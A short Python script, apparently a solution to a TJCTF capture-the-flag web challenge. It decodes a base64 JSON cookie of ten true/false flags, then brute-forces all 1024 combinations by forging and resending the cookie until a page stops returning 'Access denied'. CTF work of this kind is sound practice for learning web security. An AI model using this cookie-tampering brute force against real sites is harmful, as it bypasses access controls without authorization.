import requests
import base64

response = requests.get("https://sarah_palin_fanpage.tjctf.org/exclusive")

cdict = response.cookies.get_dict()

#the dictionary has {'__cfduid': 'd921364e25a53ac5ba11aac79429062ed1590296173', 'data': 'eyIxIjpmYWxzZSwiMiI6ZmFsc2UsIjMiOmZhbHNlLCI0IjpmYWxzZSwiNSI6ZmFsc2UsIjYiOmZhbHNlLCI3IjpmYWxzZSwiOCI6ZmFsc2UsIjkiOmZhbHNlLCIxMCI6ZmFsc2V9'}
# the data value is base64 encoded
# the value decoded to {"1":false,"2":false,"3":false,"4":false,"5":false,"6":false,"7":false,"8":false,"9":false,"10":false}

#we have to iterate over all the possibilities and find the combinations that doesnt give access denied.
# "Access denied" in response.text

def encode_dict(message):
	message_bytes = message.encode('ascii')
	base64_bytes = base64.b64encode(message_bytes)
	base64_message = base64_bytes.decode('ascii')
	return base64_message

for i in range(0,1024):
	num = str(bin(i))[2:]
	if(len(num) < 10):
		num = (10 - len(num))*'0' + num
	num = list(num)
	data = """{"""
	for i in range(len(num)):
		if(num[i] == '0'):
			data += """"{}":false,""".format(str(i+1))
		else:
			data += """"{}":true,""".format(str(i+1))
	data = data[:-1]
	data += """}"""
	
	encodeddata = encode_dict(data)
	cdict['data'] = encodeddata

	response = requests.get("https://sarah_palin_fanpage.tjctf.org/exclusive", cookies = cdict)
	if("Access denied" not in response.text):
		print(data)
		print(encodeddata)
		print(response.text)
